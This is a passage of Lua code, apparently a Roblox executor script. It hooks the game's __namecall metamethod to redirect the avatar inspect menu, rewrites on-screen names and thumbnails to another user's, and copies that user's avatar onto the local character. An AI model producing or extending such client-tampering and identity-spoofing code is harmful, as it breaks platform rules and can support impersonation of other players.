        if exactDisplayCount == 1 then return exactDisplay end
        if #prefixes > 0 then return prefixes[1] end
        if exactDisplay then return exactDisplay end
        return nil
    end

    local function resolveUserToId(input)
        if input == nil then return nil end
        if type(input) == "number" then return math.floor(input) end
        if type(input) ~= "string" then return nil end
        local t = input:gsub("^%s+",""):gsub("%s+$","")
        if t == "" then return nil end
        local n = tonumber(t)
        if n then return math.floor(n) end
        local username = t:gsub("^@","")
        if username == "" then return nil end
        local ck = normalizeForLookup(username)
        if ck == "" then return nil end
        local cached = cacheGetTimed(resolvedUserIdCache, resolvedUserIdCacheTime, ck, RESOLVED_USERID_TTL)
        if cached then return cached end
        local inServer = findUserIdInServerByNameOrDisplay(username)
        if inServer then
            return cacheSetTimed(resolvedUserIdCache, resolvedUserIdCacheTime, ck, inServer, CACHE_MAX.resolvedUserId)
        end
        local ok, uid = pcall(function() return Players:GetUserIdFromNameAsync(username) end)
        if ok and uid then
            return cacheSetTimed(resolvedUserIdCache, resolvedUserIdCacheTime, ck, uid, CACHE_MAX.resolvedUserId)
        end
        return nil
    end

    local guiSpoof = {
        active=false, serial=0, identity=nil,
        originals=setmetatable({}, {__mode="k"}),
        identityCache={}, connections={},
        boundObjects=setmetatable({}, {__mode="k"}),
        boundRoots=setmetatable({}, {__mode="k"}),
    }

    local inspectKey = "__AvatarInspectTargetState"
    local inspectState = env and env[inspectKey] or nil
    if type(inspectState) ~= "table" then
        inspectState = { active=false, targetUserId=nil, targetName=nil, targetDescription=nil, hookInstalled=false }
        if env then env[inspectKey] = inspectState end
    end
    inspectState.refreshing = false
    inspectState.lastRefresh = tonumber(inspectState.lastRefresh) or 0

    local function destroyInspectDesc()
        local d = inspectState.targetDescription
        inspectState.targetDescription = nil
        if d then pcall(function() d:Destroy() end) end
    end

    local function clearInspectTarget()
        inspectState.active = false
        inspectState.targetUserId = nil
        inspectState.targetName = nil
        inspectState.refreshing = false
        inspectState.lastRefresh = 0
        destroyInspectDesc()
    end

    local function setInspectTarget(userId, targetName, targetDesc)
        local n = tonumber(userId); if not n then return end
        if inspectState.targetUserId ~= n then
            pcall(function() GuiService:CloseInspectMenu() end)
            destroyInspectDesc()
            inspectState.refreshing = false
            inspectState.lastRefresh = 0
        end
        inspectState.active = true
        inspectState.targetUserId = n
        if targetName ~= nil then inspectState.targetName = tostring(targetName) end
        if targetDesc then
            destroyInspectDesc()
            inspectState.targetDescription = targetDesc
        end
    end

    local function getInspectUserId(v)
        local n = tonumber(v); if n then return n end
        local ok, r = pcall(function() return v.Id or v.UserId end)
        if ok then return tonumber(r) end
        return nil
    end

    local hookMM = hookmetamethod or (env and env.hookmetamethod)
    local getMethod = getnamecallmethod or (env and env.getnamecallmethod)

    if not inspectState.hookInstalled and type(hookMM) == "function" and type(getMethod) == "function" then
        local oldNamecall
        local cb = function(self, ...)
            local method = getMethod()
            local state = (env and env[inspectKey]) or inspectState
            if state and state.active and self == GuiService then
                local args = {...}
                if method == "InspectPlayerFromUserId" then
                    if getInspectUserId(args[1]) == LocalPlayer.UserId and state.targetUserId then
                        args[1] = state.targetUserId
                    end
                elseif method == "InspectPlayerFromHumanoidDescription" then
                    local req = tostring(args[2] or "")
                    if (req == LocalPlayer.Name or req == LocalPlayer.DisplayName) and state.targetDescription then
                        args[1] = state.targetDescription
                        args[2] = state.targetName or req
                    end
                end
                return oldNamecall(self, table.unpack(args))
            end
            return oldNamecall(self, ...)
        end
        local wrapped = (type(newcclosure) == "function") and newcclosure(cb) or cb
        local okH, original = pcall(function() return hookMM(game, "__namecall", wrapped) end)
        if okH and type(original) == "function" then
            oldNamecall = original
            inspectState.hookInstalled = true
        end
    end

    local function isLocalInspectTitle(v)
        if type(v) ~= "string" then return false end
        local l = string.lower(v)
        for _, name in ipairs({LocalPlayer.Name, LocalPlayer.DisplayName}) do
            local ln = string.lower(tostring(name or ""))
            if ln ~= "" and (l == ln .. "'s avatar" or l == ln .. "’s avatar") then return true end
        end
        return false
    end

    local function requestTargetInspectRefresh()
        if not inspectState.active or not inspectState.targetUserId then return end
        local now = os.clock()
        if inspectState.refreshing or now - inspectState.lastRefresh < 1.5 then return end
        inspectState.refreshing = true
        inspectState.lastRefresh = now
        task.defer(function()
            if not inspectState.active or not inspectState.targetUserId then
                inspectState.refreshing = false; return
            end
            pcall(function() GuiService:CloseInspectMenu() end)
            task.wait()
            local opened = pcall(function() GuiService:InspectPlayerFromUserId(inspectState.targetUserId) end)
            if not opened and inspectState.targetDescription then
                pcall(function()
                    GuiService:InspectPlayerFromHumanoidDescription(
                        inspectState.targetDescription,
                        inspectState.targetName or tostring(inspectState.targetUserId))
                end)
            end
            task.delay(1.25, function() inspectState.refreshing = false end)
        end)
    end

    local function replacePlainText(v, from, to)
        if type(v) ~= "string" or type(from) ~= "string" or from == "" then return v end
        local pattern = from:gsub("([^%w])", "%%%1")
        return v:gsub(pattern, function() return tostring(to or "") end)
    end

    local function isIdentityWordChar(c)
        return type(c) == "string" and c ~= "" and c:match("[%w_]") ~= nil
    end

    local function replaceIdentityText(v, from, to)
        if type(v) ~= "string" or type(from) ~= "string" or from == "" then return v, false end
        local out, cursor, changed = {}, 1, false
        local fb = isIdentityWordChar(from:sub(1,1))
        local lb = isIdentityWordChar(from:sub(-1))
        while cursor <= #v do
            local s, e = v:find(from, cursor, true)
            if not s then out[#out+1] = v:sub(cursor); break end
            local before = s > 1 and v:sub(s-1, s-1) or ""
            local after = e < #v and v:sub(e+1, e+1) or ""
            if (not fb or not isIdentityWordChar(before)) and (not lb or not isIdentityWordChar(after)) then
                out[#out+1] = v:sub(cursor, s-1)
                out[#out+1] = tostring(to or "")
                cursor = e + 1
                changed = true
            else
                out[#out+1] = v:sub(cursor, s)
                cursor = s + 1
            end
        end
        return table.concat(out), changed
    end

    local function addReplacement(list, seen, from, to)
        if type(from) ~= "string" or from == "" or seen[from] then return end
        seen[from] = true
        list[#list+1] = { from = from, to = tostring(to or "") }
    end

    local function buildIdentityReplacements(identity)
        local reps, seen = {}, {}
        local function addVariants(from, to)
            addReplacement(reps, seen, from, to)
            addReplacement(reps, seen, from:lower(), to:lower())
            addReplacement(reps, seen, from:upper(), to:upper())
        end
        addVariants("@" .. LocalPlayer.Name, "@" .. identity.username)
        addVariants(LocalPlayer.DisplayName, identity.displayName)
        addVariants(LocalPlayer.Name, identity.username)
        table.sort(reps, function(a,b) return #a.from > #b.from end)
        return reps
    end

    local function getThumbnailContent(userId, ttype, tsize)
        local ok, c = pcall(function() return Players:GetUserThumbnailAsync(userId, ttype, tsize) end)
        if ok and type(c) == "string" and c ~= "" then return c end
        return nil
    end

    local function buildThumbnailContentMap(userId)
        local map = {}
        local specs = {
            {Enum.ThumbnailType.HeadShot,"Size48x48"},{Enum.ThumbnailType.HeadShot,"Size60x60"},
            {Enum.ThumbnailType.HeadShot,"Size100x100"},{Enum.ThumbnailType.HeadShot,"Size150x150"},
            {Enum.ThumbnailType.HeadShot,"Size420x420"},{Enum.ThumbnailType.AvatarBust,"Size150x150"},
            {Enum.ThumbnailType.AvatarBust,"Size352x352"},{Enum.ThumbnailType.AvatarBust,"Size420x420"},
            {Enum.ThumbnailType.AvatarThumbnail,"Size150x150"},{Enum.ThumbnailType.AvatarThumbnail,"Size352x352"},
            {Enum.ThumbnailType.AvatarThumbnail,"Size420x420"},{Enum.ThumbnailType.AvatarThumbnail,"Size720x720"},
        }
        for _, spec in ipairs(specs) do
            local okS, sizeVal = pcall(function() return Enum.ThumbnailSize[spec[2]] end)
            if okS and sizeVal then
                local oc = getThumbnailContent(LocalPlayer.UserId, spec[1], sizeVal)
                local tc = getThumbnailContent(userId, spec[1], sizeVal)
                if oc and tc then map[oc] = tc end
            end
        end
        return map
    end

    local function getTargetIdentity(userId)
        local cached = guiSpoof.identityCache[userId]
        if cached and os.clock() - cached.timestamp <= 60 then return cached.identity end
        local tp = nil
        pcall(function() tp = Players:GetPlayerByUserId(userId) end)
        local username = tp and tp.Name or nil
        local displayName = tp and tp.DisplayName or nil
        if not username or not displayName then
            local okUS, us = pcall(function() return game:GetService("UserService") end)
            if okUS and us then
                local okI, infos = pcall(function() return us:GetUserInfosByUserIdsAsync({userId}) end)
                local info = okI and type(infos) == "table" and infos[1] or nil
                if info then
                    username = username or info.Username or info.Name
                    displayName = displayName or info.DisplayName
                end
            end
        end
        if not username then
            local okN, name = pcall(function() return Players:GetNameFromUserIdAsync(userId) end)
            if okN then username = name end
        end
        username = tostring(username or userId)
        displayName = tostring(displayName or username)
        local identity = { userId=userId, username=username, displayName=displayName, thumbnailMap={} }
        identity.replacements = buildIdentityReplacements(identity)
        guiSpoof.identityCache[userId] = { identity = identity, timestamp = os.clock() }
        task.spawn(function()
            local tmap = buildThumbnailContentMap(userId)
            local entry = guiSpoof.identityCache[userId]
            if entry and entry.identity == identity then identity.thumbnailMap = tmap end
        end)
        return identity
    end

    local function rememberGuiProp(inst, prop, orig, spoofed)
        local props = guiSpoof.originals[inst]
        if not props then props = {}; guiSpoof.originals[inst] = props end
        local e = props[prop]
        if not e then e = { original = orig, spoofed = spoofed }; props[prop] = e
        else e.spoofed = spoofed end
    end

    local function disconnectGuiConns()
        for i = #guiSpoof.connections, 1, -1 do
            local c = guiSpoof.connections[i]
            guiSpoof.connections[i] = nil
            if c and c.Connected then pcall(function() c:Disconnect() end) end
        end
        guiSpoof.boundObjects = setmetatable({}, {__mode="k"})
        guiSpoof.boundRoots   = setmetatable({}, {__mode="k"})
    end

    local function restoreGuiIdentity()
        guiSpoof.active = false
        guiSpoof.serial = guiSpoof.serial + 1
        disconnectGuiConns()
        for inst, props in pairs(guiSpoof.originals) do
            if inst then
                for prop, e in pairs(props) do
                    pcall(function()
                        if inst[prop] == e.spoofed then inst[prop] = e.original end
                    end)
                end
            end
        end
        guiSpoof.originals = setmetatable({}, {__mode="k"})
        guiSpoof.identity = nil
    end

    local function spoofIdentityText(v, identity)
        if type(v) ~= "string" or v == "" then return v end
        local result = v
        local applied = {}
        for i, rep in ipairs(identity.replacements) do
            local token = "\1AV_ID_" .. tostring(i) .. "\2"
            local r, changed = replaceIdentityText(result, rep.from, token)
            if changed then
                result = r
                applied[#applied+1] = { token = token, value = rep.to }
            end
        end
        for _, rep in ipairs(applied) do
            result = replacePlainText(result, rep.token, rep.value)
        end
        return result
    end

    local function spoofIdentityImage(v, identity)
        if type(v) ~= "string" or v == "" then return v end
        local mapped = identity.thumbnailMap[v]
        if mapped then return mapped end
        local lid = tostring(LocalPlayer.UserId)
        if not v:find(lid, 1, true) then return v end
        local lv = v:lower()
        if not (lv:find("rbxthumb",1,true) or lv:find("thumbnail",1,true)
             or lv:find("headshot",1,true) or lv:find("avatar",1,true)
             or lv:find("userid",1,true) or lv:find("userids",1,true)) then
            return v
        end
        return replacePlainText(v, lid, tostring(identity.userId))
    end

    local function applyIdentityToGuiObject(inst, identity)
        if not inst then return end
        if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then
            local okT, cur = pcall(function() return inst.Text end)
            if okT then
                if isLocalInspectTitle(cur) then requestTargetInspectRefresh() end
                local s = spoofIdentityText(cur, identity)
                if s ~= cur then
                    local okS = pcall(function() inst.Text = s end)
                    if okS then rememberGuiProp(inst, "Text", cur, s) end
                end
            end
        elseif inst:IsA("ImageLabel") or inst:IsA("ImageButton") then
            local okI, cur = pcall(function() return inst.Image end)
            if okI then
                local s = spoofIdentityImage(cur, identity)
                if s ~= cur then
                    local okS = pcall(function() inst.Image = s end)
                    if okS then rememberGuiProp(inst, "Image", cur, s) end
                end
            end
        end
    end

    local function bindIdentityGuiObject(inst, identity)
        if not inst or guiSpoof.boundObjects[inst] then return end
        local prop = nil
        if inst:IsA("TextLabel") or inst:IsA("TextButton") or inst:IsA("TextBox") then prop = "Text"
        elseif inst:IsA("ImageLabel") or inst:IsA("ImageButton") then prop = "Image" end
        if not prop then return end
        local okC, conn = pcall(function()
            return inst:GetPropertyChangedSignal(prop):Connect(function()
                if not guiSpoof.active or guiSpoof.identity ~= identity then return end
                applyIdentityToGuiObject(inst, identity)
            end)
        end)
        if okC and conn then
            guiSpoof.boundObjects[inst] = true
            guiSpoof.connections[#guiSpoof.connections+1] = conn
        end
    end

    local function watchIdentityRoot(root, identity)
        if not root or guiSpoof.boundRoots[root] then return end
        local okC, conn = pcall(function()
            return root.DescendantAdded:Connect(function(inst)
                if not guiSpoof.active or guiSpoof.identity ~= identity then return end
                bindIdentityGuiObject(inst, identity)
                applyIdentityToGuiObject(inst, identity)
            end)
        end)
        if okC and conn then
            guiSpoof.boundRoots[root] = true
            guiSpoof.connections[#guiSpoof.connections+1] = conn
        end
    end

    local function scanIdentityGui(identity)
        local roots = { CoreGui, LocalPlayer:FindFirstChildOfClass("PlayerGui") }
        for _, root in ipairs(roots) do
            if root then
                watchIdentityRoot(root, identity)
                applyIdentityToGuiObject(root, identity)
                local okD, desc = pcall(function() return root:GetDescendants() end)
                if okD then
                    for _, inst in ipairs(desc) do
                        bindIdentityGuiObject(inst, identity)
                        applyIdentityToGuiObject(inst, identity)
                    end
                end
            end
        end
    end

    local applySerialRef = { value = 0 }

    local function startGuiIdentity(userId, applyToken)
        restoreGuiIdentity()
        setInspectTarget(userId)
        guiSpoof.active = true
        guiSpoof.serial = guiSpoof.serial + 1
        local guiToken = guiSpoof.serial
        task.spawn(function()
            local identity = getTargetIdentity(userId)
            if not guiSpoof.active or guiToken ~= guiSpoof.serial then return end
            if applyToken ~= applySerialRef.value then return end
            guiSpoof.identity = identity
            setInspectTarget(userId, identity.displayName)
            task.spawn(function()
                local desc = getTargetDescriptionCached(userId)
                if not guiSpoof.active or guiToken ~= guiSpoof.serial then
                    if desc then pcall(function() desc:Destroy() end) end
                    return
                end
                if desc then setInspectTarget(userId, identity.displayName, desc) end
            end)
            -- initial scan once
            scanIdentityGui(identity)
            while guiSpoof.active and guiToken == guiSpoof.serial and applyToken == applySerialRef.value do
                -- light refresh only (DescendantAdded already covers new UI)
                task.wait(8)
                if not guiSpoof.active or guiToken ~= guiSpoof.serial then break end
                -- only re-apply text/image on already-bound objects, no full GetDescendants
                if guiSpoof.identity == identity then
                    for inst in pairs(guiSpoof.boundObjects) do
                        if inst and inst.Parent then
                            pcall(applyIdentityToGuiObject, inst, identity)
                        end
                    end
                end
            end
        end)
    end

    local COPY_CLASSES = {"Shirt","Pants","ShirtGraphic","Accessory","Hat","BodyColors","CharacterMesh"}
    local COPY_CLASS_SET = {}
    for _, c in ipairs(COPY_CLASSES) do COPY_CLASS_SET[c] = true end

    local COPY_ANIMATION_FIELDS = {"ClimbAnimation","FallAnimation","IdleAnimation","JumpAnimation","RunAnimation","SwimAnimation","WalkAnimation"}

    local BODY_PART_NAMES = {
        "Head","Torso","UpperTorso","LowerTorso",
        "LeftArm","RightArm","LeftLeg","RightLeg",
        "LeftUpperArm","LeftLowerArm","LeftHand",
        "RightUpperArm","RightLowerArm","RightHand",
        "LeftUpperLeg","LeftLowerLeg","LeftFoot",
        "RightUpperLeg","RightLowerLeg","RightFoot",
    }

    local runtime = {
        active = Cfg['Enabled'] == true,
        applySerial = 0,
        currentUserId = nil,
        appearanceChildConn = nil,
        appearanceScaleConns = {},
        colorSnapshot = nil,
    }

    local function isCopyClass(c) return COPY_CLASS_SET[c] == true end
    local function shouldCloneClass(c) return isCopyClass(c) and c ~= "BodyColors" end
    local function isAccessoryClass(c) return c == "Accessory" or c == "Hat" end

    local function buildBasePartMap(model)
        local out = {}
        if not model then return out end
        for _, child in ipairs(model:GetChildren()) do
            if child:IsA("BasePart") then out[child.Name] = child end
        end
        return out
    end

    local function buildAttachmentCarrierMap(partMap)
        local carrier = {}
        for partName, part in pairs(partMap or {}) do
            for _, child in ipairs(part:GetChildren()) do
                if child:IsA("Attachment") then
                    local prev = carrier[child.Name]
                    if prev == nil then carrier[child.Name] = partName
                    elseif prev ~= partName then carrier[child.Name] = false end
                end
            end
        end
        return carrier
    end

    local function firstDecalTextureFromHead(head)
        if not head then return nil end
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("Decal") and child.Face == Enum.NormalId.Front and child.Texture ~= "" then
                return child.Texture
            end
        end
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("Decal") and child.Texture ~= "" then return child.Texture end
        end
        return nil
    end

    local function cacheFaceTexture(userId, texture)
        if texture and texture ~= "" then
            cacheSetTimed(faceTextureCache, faceTextureCacheTime, userId, texture, CACHE_MAX.faceTexture)
        end
        return texture
    end

    local function resolveFaceFromAssetId(assetId, userId)
        local ok, model = pcall(function() return InsertService:LoadAsset(assetId) end)
        if ok and model then
            local found = nil
            for _, inst in ipairs(model:GetDescendants()) do
                if inst:IsA("Decal") and inst.Texture ~= "" then found = inst.Texture; break end
            end
            model:Destroy()
            if found then return cacheFaceTexture(userId, found) end
        end
        return cacheFaceTexture(userId, "rbxassetid://" .. tostring(assetId))
    end

    local function resolveFaceTexture(userId, appearanceModel, targetDesc)
        local cached = cacheGetTimed(faceTextureCache, faceTextureCacheTime, userId, AVATAR_CACHE_TTL)
        if cached then return cached end
        local head = appearanceModel and appearanceModel:FindFirstChild("Head")
        local direct = firstDecalTextureFromHead(head)
        if direct then return cacheFaceTexture(userId, direct) end
        if targetDesc and targetDesc.Face and targetDesc.Face ~= 0 then
            return resolveFaceFromAssetId(targetDesc.Face, userId)
        end
        local info = getAppearanceInfoCached(userId)
        if info and info.assets then
            for _, asset in ipairs(info.assets) do
                if asset.assetType and asset.assetType.id == 18 and asset.id then
                    return resolveFaceFromAssetId(asset.id, userId)
                end
            end
        end
        return nil
    end

    local function applyFaceTexture(char, texture)
        local head = char:FindFirstChild("Head")
        if not head then return end
        for _, child in ipairs(head:GetChildren()) do
            if child:IsA("Decal") and (child.Name == "face" or child.Face == Enum.NormalId.Front) then
                child:Destroy()
            end
        end
        if head:IsA("MeshPart") then pcall(function() head.TextureID = "" end) end
        local mesh = head:FindFirstChildOfClass("SpecialMesh")
        if mesh then pcall(function() mesh.TextureId = "" end) end
        local sa = head:FindFirstChildOfClass("SurfaceAppearance")
        if sa then pcall(function() sa:Destroy() end) end
        if not texture or texture == "" then texture = "rbxassetid://0" end
        local decal = Instance.new("Decal")
        decal.Name = "face"
        decal.Face = Enum.NormalId.Front
        decal.Texture = texture
        decal.Parent = head
    end

    local function buildSourcePartSizeMap(srcModel)
        local sizes = {}
        for _, part in ipairs(srcModel:GetChildren()) do
            if part:IsA("BasePart") then sizes[part.Name] = part.Size end
        end
        return sizes
    end

    local function scaleAccessoryOnce(acc, char, sourcePartSizeMap, charPartMap, attachmentCarrierMap)
        local handle = acc:FindFirstChild("Handle")
        if not handle or not handle:IsA("BasePart") then return end
        local matched = nil
        for _, hChild in ipairs(handle:GetChildren()) do
            if hChild:IsA("Attachment") then
                local carrier = attachmentCarrierMap and attachmentCarrierMap[hChild.Name] or nil
                if type(carrier) == "string" then matched = carrier; break end
                if carrier == false then
                    local scan = charPartMap or buildBasePartMap(char)
                    for partName, bodyPart in pairs(scan) do
                        if bodyPart and bodyPart:IsA("BasePart") and bodyPart:FindFirstChild(hChild.Name) then
                            matched = partName; break
                        end
                    end
                end
            end
            if matched then break end
        end
        if not handle:GetAttribute("_cpBaseSizeX") then
            handle:SetAttribute("_cpBaseSizeX", handle.Size.X)
            handle:SetAttribute("_cpBaseSizeY", handle.Size.Y)
            handle:SetAttribute("_cpBaseSizeZ", handle.Size.Z)
            for _, hChild in ipairs(handle:GetChildren()) do
                if hChild:IsA("Attachment") then
                    hChild:SetAttribute("_cpBasePosX", hChild.Position.X)
                    hChild:SetAttribute("_cpBasePosY", hChild.Position.Y)
                    hChild:SetAttribute("_cpBasePosZ", hChild.Position.Z)
                end
            end
            local sm0 = handle:FindFirstChildOfClass("SpecialMesh")
            if sm0 then
                sm0:SetAttribute("_cpBaseScaleX", sm0.Scale.X)
                sm0:SetAttribute("_cpBaseScaleY", sm0.Scale.Y)
                sm0:SetAttribute("_cpBaseScaleZ", sm0.Scale.Z)
            end
        end
        local scale = nil
        if matched then
            local srcSize = sourcePartSizeMap[matched]
            local dst = char:FindFirstChild(matched)
            if srcSize and dst and dst:IsA("BasePart") then
                local sx = math.max(srcSize.X, 0.001)
                local sy = math.max(srcSize.Y, 0.001)
                local sz = math.max(srcSize.Z, 0.001)
                scale = (dst.Size.X/sx + dst.Size.Y/sy + dst.Size.Z/sz) / 3
            end
        end
        local function applyScale(s)
            local bx, by, bz = handle:GetAttribute("_cpBaseSizeX"), handle:GetAttribute("_cpBaseSizeY"), handle:GetAttribute("_cpBaseSizeZ")
            if bx and by and bz then pcall(function() handle.Size = Vector3.new(bx*s, by*s, bz*s) end) end
            for _, hChild in ipairs(handle:GetChildren()) do
                if hChild:IsA("Attachment") then
                    local px, py, pz = hChild:GetAttribute("_cpBasePosX"), hChild:GetAttribute("_cpBasePosY"), hChild:GetAttribute("_cpBasePosZ")
                    if px and py and pz then pcall(function() hChild.Position = Vector3.new(px*s, py*s, pz*s) end) end
                end
            end
            local sm = handle:FindFirstChildOfClass("SpecialMesh")
            if sm then
                local msx, msy, msz = sm:GetAttribute("_cpBaseScaleX"), sm:GetAttribute("_cpBaseScaleY"), sm:GetAttribute("_cpBaseScaleZ")
                pcall(function()
                    if msx and msy and msz then sm.Scale = Vector3.new(msx*s, msy*s, msz*s)
                    else sm.Scale = sm.Scale * s end
                end)
            end
        end
        if scale and math.abs(scale - 1) > 0.01 then applyScale(scale) else applyScale(1) end
    end

    local function applyBodyFromDescription(targetDesc, char)
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum or not targetDesc then return false end
        for _, f in ipairs(COPY_ANIMATION_FIELDS) do
            pcall(function() targetDesc[f] = 0 end)
        end
        return pcall(function() hum:ApplyDescription(targetDesc) end)
    end

    local function toColor3(value)
        local k = typeof(value)
        if k == "Color3" then return value end
        if k == "BrickColor" then return value.Color end
        if k == "number" then
            local ok, brick = pcall(function() return BrickColor.new(value) end)
            if ok and brick then return brick.Color end
        end
        return nil
    end

    local function snapshotColors(char)
        if not char then return nil end
        local s = { bodyColors = nil, partColors = {} }
        local bc = char:FindFirstChildOfClass("BodyColors")
        if bc then s.bodyColors = bc:Clone() end
        for _, c in ipairs(char:GetChildren()) do
            if c:IsA("BasePart") then s.partColors[c.Name] = c.BrickColor end
        end
        return s
    end

    local function destroyColorSnapshot(s)
        if not s then return end
        if s.bodyColors then pcall(function() s.bodyColors:Destroy() end); s.bodyColors = nil end
    end

    local function applyColors(targetDesc, char, sourceModel, preferred)
        if not char then return end
        local bc = char:FindFirstChildOfClass("BodyColors")
        if not bc then bc = Instance.new("BodyColors"); bc.Parent = char end
        local p = preferred and preferred.bodyColors or nil
        local s = sourceModel and sourceModel:FindFirstChildOfClass("BodyColors")
        local hc  = (p and p.HeadColor3)     or (targetDesc and toColor3(targetDesc.HeadColor))     or (s and s.HeadColor3)
        local lac = (p and p.LeftArmColor3)  or (targetDesc and toColor3(targetDesc.LeftArmColor))  or (s and s.LeftArmColor3)
        local rac = (p and p.RightArmColor3) or (targetDesc and toColor3(targetDesc.RightArmColor)) or (s and s.RightArmColor3)
        local tc  = (p and p.TorsoColor3)    or (targetDesc and toColor3(targetDesc.TorsoColor))    or (s and s.TorsoColor3)
        local llc = (p and p.LeftLegColor3)  or (targetDesc and toColor3(targetDesc.LeftLegColor))  or (s and s.LeftLegColor3)
        local rlc = (p and p.RightLegColor3) or (targetDesc and toColor3(targetDesc.RightLegColor)) or (s and s.RightLegColor3)
        if hc  then bc.HeadColor3 = hc end
        if lac then bc.LeftArmColor3 = lac end
        if rac then bc.RightArmColor3 = rac end
        if tc  then bc.TorsoColor3 = tc end
        if llc then bc.LeftLegColor3 = llc end
        if rlc then bc.RightLegColor3 = rlc end
        local pmap = {
            Head=hc, Torso=tc, UpperTorso=tc, LowerTorso=tc,
            LeftArm=lac, RightArm=rac, LeftLeg=llc, RightLeg=rlc,
            ["Left Arm"]=lac, ["Right Arm"]=rac, ["Left Leg"]=llc, ["Right Leg"]=rlc,
            LeftUpperArm=lac, LeftLowerArm=lac, LeftHand=lac,
            RightUpperArm=rac, RightLowerArm=rac, RightHand=rac,
            LeftUpperLeg=llc, LeftLowerLeg=llc, LeftFoot=llc,
            RightUpperLeg=rlc, RightLowerLeg=rlc, RightFoot=rlc,
        }
        for name, c3 in pairs(pmap) do
            if c3 then
                local part = char:FindFirstChild(name)
                if part and part:IsA("BasePart") then pcall(function() part.Color = c3 end) end
            end
        end
    end

    local function clearCopyChildren(char)
        for _, inst in ipairs(char:GetChildren()) do
            if isCopyClass(inst.ClassName) then pcall(function() inst:Destroy() end) end
        end
    end

    local function hasAnySourceBodyPart(model)
        for _, n in ipairs(BODY_PART_NAMES) do
            if model:FindFirstChild(n) then return true end
        end
        return false
    end

    local sizeToken = 0
    local function enforceBodySize(character)
        local cfg = CONFIG.changer
        if not cfg then return end
        if not character or not character.Parent then return end
        local hum = character:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local map = {
            BodyWidthScale=cfg.width, BodyDepthScale=cfg.depth, BodyHeightScale=cfg.height,
            HeadScale=cfg.head, BodyProportionScale=cfg.proportion, BodyTypeScale=cfg.bodyType,
        }
        for name, value in pairs(map) do
            if type(value) == "number" then
                local nv = hum:FindFirstChild(name)
                if nv and nv:IsA("NumberValue") and math.abs(nv.Value - value) > 0.001 then
                    pcall(function() nv.Value = value end)
                end
            end
        end
    end

    local function enforceBodySizeLoop(character)
        sizeToken = sizeToken + 1
        local myToken = sizeToken
        task.spawn(function()
            while myToken == sizeToken do
                task.wait(CONFIG.changer.enforceIntervalSeconds or 0.8)
                if myToken ~= sizeToken then return end
                local cur = LocalPlayer.Character
                character = (cur and cur.Parent) and cur or nil
                if character then enforceBodySize(character) end
            end
        end)
    end

    local function getTargetBodyScales(userId, targetDesc)
        local scales = {
            width = targetDesc and targetDesc.WidthScale or 1,
            depth = targetDesc and targetDesc.DepthScale or 1,
            height = targetDesc and targetDesc.HeightScale or 1,
            head = targetDesc and targetDesc.HeadScale or 1,
            proportion = targetDesc and targetDesc.ProportionScale or 0,
            bodyType = targetDesc and targetDesc.BodyTypeScale or 0,
        }
        local ok, tp = pcall(function() return Players:GetPlayerByUserId(userId) end)
        local tc = ok and tp and tp.Character
        local th = tc and tc:FindFirstChildOfClass("Humanoid")
        if not th then return scales end
        local function read(name, fb)
            local nv = th:FindFirstChild(name)
            if nv and nv:IsA("NumberValue") then return nv.Value end
            return fb
        end
        scales.width      = read("BodyWidthScale", scales.width)
        scales.depth      = read("BodyDepthScale", scales.depth)
        scales.height     = read("BodyHeightScale", scales.height)
        scales.head       = read("HeadScale", scales.head)
        scales.proportion = read("BodyProportionScale", scales.proportion)
        scales.bodyType   = read("BodyTypeScale", scales.bodyType)
        return scales
    end

    local function disconnectAppearanceHooks()
        if runtime.appearanceChildConn then
            runtime.appearanceChildConn:Disconnect()
            runtime.appearanceChildConn = nil
        end
        for i = #runtime.appearanceScaleConns, 1, -1 do
            local c = runtime.appearanceScaleConns[i]
            if c and c.Connected then c:Disconnect() end
            runtime.appearanceScaleConns[i] = nil
        end
    end

    local function applyAppearance(userId, char, applyToken)
        if applyToken ~= applySerialRef.value or not runtime.active then return end
        local model = getAppearanceModel(userId)
        if not model then return end
        if applyToken ~= applySerialRef.value or not runtime.active then model:Destroy(); return end

        clearCopyChildren(char)
        local sourceModel = model
        local humModel, bodyModel = nil, nil
        if not sourceModel:FindFirstChild("Head") or not hasAnySourceBodyPart(sourceModel) then
            local ok, created = pcall(function() return Players:CreateHumanoidModelFromUserId(userId) end)
            if ok and created then humModel = created; sourceModel = humModel end
        end
        if applyToken ~= applySerialRef.value then
            if humModel then humModel:Destroy() end
            model:Destroy(); return
        end

        local targetDesc = getTargetDescriptionCached(userId)
        CONFIG.changer.targetScales = getTargetBodyScales(userId, targetDesc)
        local bodyApplied = applyBodyFromDescription(targetDesc, char)
        task.wait()

        local postDesc = nil
        if bodyApplied then postDesc = snapshotColors(char) end
        local delayedSkin = nil
        if postDesc and postDesc.bodyColors then
            delayedSkin = { bodyColors = postDesc.bodyColors:Clone(), partColors = {} }
            for k, v in pairs(postDesc.partColors or {}) do delayedSkin.partColors[k] = v end
        end

        if applyToken ~= applySerialRef.value then
            destroyColorSnapshot(postDesc); destroyColorSnapshot(delayedSkin)
            if bodyModel then bodyModel:Destroy() end
            if humModel then humModel:Destroy() end
            model:Destroy(); return
        end

        if bodyApplied and not bodyModel then
            local okB, created = pcall(function() return Players:CreateHumanoidModelFromUserId(userId) end)
            if okB and created then bodyModel = created end
        end

        local bodySource = bodyModel or sourceModel
        local desiredFace = resolveFaceTexture(userId, bodySource, targetDesc)
        local sourceSizeMap = buildSourcePartSizeMap(bodySource)
        local charPartMap = buildBasePartMap(char)
        local carrier = buildAttachmentCarrierMap(charPartMap)

        for _, partName in ipairs(BODY_PART_NAMES) do
            if bodyApplied then
                if partName == "Head" then applyFaceTexture(char, desiredFace) end
            else
                local src = bodySource:FindFirstChild(partName) or sourceModel:FindFirstChild(partName)
                local dst = char:FindFirstChild(partName)
                if src and dst then
                    dst.Transparency = src.Transparency
                    local sm = src:FindFirstChildOfClass("SpecialMesh")
                    local dm = dst:FindFirstChildOfClass("SpecialMesh")
                    if sm then
                        if not dm then dm = sm:Clone(); dm.Parent = dst
                        else dm.MeshId = sm.MeshId; dm.TextureId = sm.TextureId; dm.Scale = sm.Scale; dm.Offset = sm.Offset end
                    elseif dm then dm:Destroy() end
                    pcall(function()
                        if src:IsA("MeshPart") and dst:IsA("MeshPart") then
                            dst.MeshId = src.MeshId; dst.TextureID = src.TextureID
                        end
                    end)
                    for _, att in ipairs(src:GetChildren()) do
                        if att:IsA("Attachment") then
